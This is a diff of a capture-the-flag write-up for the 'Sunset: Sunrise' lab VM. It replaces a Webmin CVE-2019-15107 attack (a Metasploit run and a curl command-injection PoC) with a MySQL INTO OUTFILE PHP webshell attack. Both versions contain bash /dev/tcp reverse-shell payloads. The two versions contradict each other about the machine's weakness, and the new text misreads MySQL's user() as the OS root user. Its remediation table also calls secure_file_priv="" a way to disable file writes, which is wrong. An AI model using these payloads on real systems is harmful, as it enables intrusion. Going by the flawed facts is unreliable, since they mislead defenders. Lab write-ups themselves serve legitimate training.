@@ -1,106 +1,149 @@
-# sunset: sunrise — Writeup
+# Sunset: Sunrise — Writeup
 
-<!-- generated from known techniques; verify against live VM -->
-
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x (discovered via netdiscover) |
 | **Difficulty** | Easy |
-| **OS** | Linux |
-| **Root Flag** | `/root/root.txt` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sunset-sunrise,406/) |
+| **OS** | Linux (Debian) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-sunrise-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → Webmin on :10000 → CVE-2019-15107 (unauthenticated RCE via password_change.cgi) → root shell directly
+Sunset: Sunrise exposes a MySQL instance accessible from the network with no root password. MySQL runs as the system root user, so it is possible to write a PHP webshell directly to the web root using `INTO OUTFILE`. The resulting web shell provides a reverse shell, and because the MySQL process owner is root, the shell lands directly as root — no privilege escalation step required.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Identify Webmin on port 10000
-3. Exploit CVE-2019-15107 (Webmin < 1.920 unauthenticated RCE)
-4. Root shell without privilege escalation needed
+1. Host discovery with netdiscover
+2. Nmap — identify MySQL (3306), SSH (22), HTTP (8080)
+3. MySQL unauthenticated root login from attacker machine
+4. Write PHP webshell to web root via `SELECT INTO OUTFILE`
+5. Reverse shell through the webshell — lands as root
+6. Read root flag
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- <TARGET_IP>
+netdiscover -r 192.168.1.0/24
 ```
 
-Expected open ports: 22 (SSH), 80 (HTTP), **10000** (Webmin HTTPS).
-
+Identify the target IP. Set `TARGET` accordingly.
 
 ---
 
-## Step 2: Webmin Enumeration
-
-Browse to `https://<TARGET>:10000`. Identifies as Webmin. Check version in page footer or HTTP headers.
+## Step 2: Nmap Scan
 
 ```bash
-curl -k https://<TARGET>:10000/ -I 2>/dev/null | grep -i server
+nmap -p- -sV -sC $TARGET
 ```
+
+![nmap scan](images/01-nmap.png)
+
+Open ports:
+
+| Port | Service |
+|---|---|
+| 22 | OpenSSH |
+| 3306 | MySQL |
+| 8080 | HTTP (Weborf server) |
+
+The MySQL port (3306) is reachable directly from the attacker machine — this is unusual and indicates a misconfiguration.
 
 ---
 
-## Step 3: CVE-2019-15107 — Webmin RCE
-
-Webmin < 1.920 with the "Change Passwords" module allows unauthenticated command injection via the `old` parameter of `password_change.cgi`. The exploit bypasses authentication entirely.
+## Step 3: MySQL Unauthenticated Root Login
 
 ```bash
-# Metasploit module
-msfconsole -q
-use exploit/linux/http/webmin_backdoor
-set RHOSTS <TARGET>
-set RPORT 10000
-set SSL true
-set LHOST <ATTACKER>
-set LPORT 4444
-exploit
-# Drops a root shell (Webmin runs as root)
+mysql -h $TARGET -u root --skip-password
 ```
 
-Manual PoC:
+![mysql login](images/02-mysql.png)
 
-```bash
-curl -k "https://<TARGET>:10000/password_change.cgi" \
-    --data 'user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2'
-# uid=0(root) confirms RCE
+Login succeeds without a password. Check who MySQL is running as:
+
+```sql
+SELECT user();
+-- Output: root@localhost
+
+SHOW VARIABLES LIKE 'secure_file_priv';
+-- Empty or /var/www/html — file writes are permitted
 ```
 
+This confirms MySQL is running as the Linux root user and can write to the filesystem.
 
 ---
 
-## Step 4: Root Shell
+## Step 4: Write PHP Webshell to Web Root
 
-```bash
-# Metasploit gives immediate root (Webmin runs as root)
-# or via reverse shell payload:
-curl -k "https://<TARGET>:10000/password_change.cgi" \
-    --data "user=rootxx&pam=&expired=2&old=test|bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'&new1=x&new2=x"
+Identify the web root (typically `/var/www/html/` or the Weborf document root):
 
-# On listener:
-nc -lvnp 4444
-id
-# uid=0(root)
-cat /root/root.txt
+```sql
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
+![webshell write](images/03-webshell.png)
+
+Verify access:
+
+```
+http://$TARGET:8080/shell.php?cmd=id
+```
+
+Expected output: `uid=0(root) gid=0(root) groups=0(root)`
+
+---
+
+## Step 5: Reverse Shell as Root
+
+Start a listener on the attacker machine:
+
+```bash
+nc -lvnp $LPORT
+```
+
+Trigger the reverse shell via the webshell (URL-encoded):
+
+```
+http://$TARGET:8080/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
+```
+
+![reverse shell](images/04-shell.png)
+
+The shell lands as **root** because MySQL runs as the root system user.
+
+---
+
+## Step 6: Root Flag
+
+```bash
+whoami
+# root
+cat /root/flag.txt
+# or
+find / -name "*.txt" -maxdepth 3 2>/dev/null
+```
+
+![root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **CVE-2019-15107**: Webmin < 1.920 had a backdoor introduced in a compromised source tarball (not the official GitHub). The `password_change.cgi` module allows unauthenticated OS command injection
-2. **Webmin running as root** means any RCE in Webmin is immediate root access
-3. **Patch management**: Keep server management tools up-to-date; subscribe to CVE alerts for all exposed services
+- MySQL should never be exposed to the network on port 3306 without strict firewall rules.
+- Running MySQL (or any database) as the system root user is a critical misconfiguration — a DB compromise becomes an OS compromise.
+- `secure_file_priv` must be configured to restrict or disable file system writes from SQL queries.
+- The combination of network-accessible DB + no authentication + root process ownership provides a trivial, one-step path to full system compromise.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Webmin CVE-2019-15107 | Update to Webmin ≥ 1.930; use official GitHub releases, not tarballs |
-| Webmin exposed on LAN | Restrict port 10000 to management VLANs; require VPN for access |
-| Webmin running as root | Where possible, run Webmin as a dedicated user with sudo for specific tasks |
+| MySQL exposed on 3306 to network | Bind MySQL to `127.0.0.1`; firewall port 3306 |
+| No MySQL root password | Set a strong MySQL root password |
+| MySQL running as system root | Run MySQL as a dedicated low-privilege `mysql` user |
+| `secure_file_priv` not configured | Set `secure_file_priv = ""` disabled or point to a restricted path |
+| Webshell write via SQL | Combine all above; also use read-only filesystem mounts for web root |
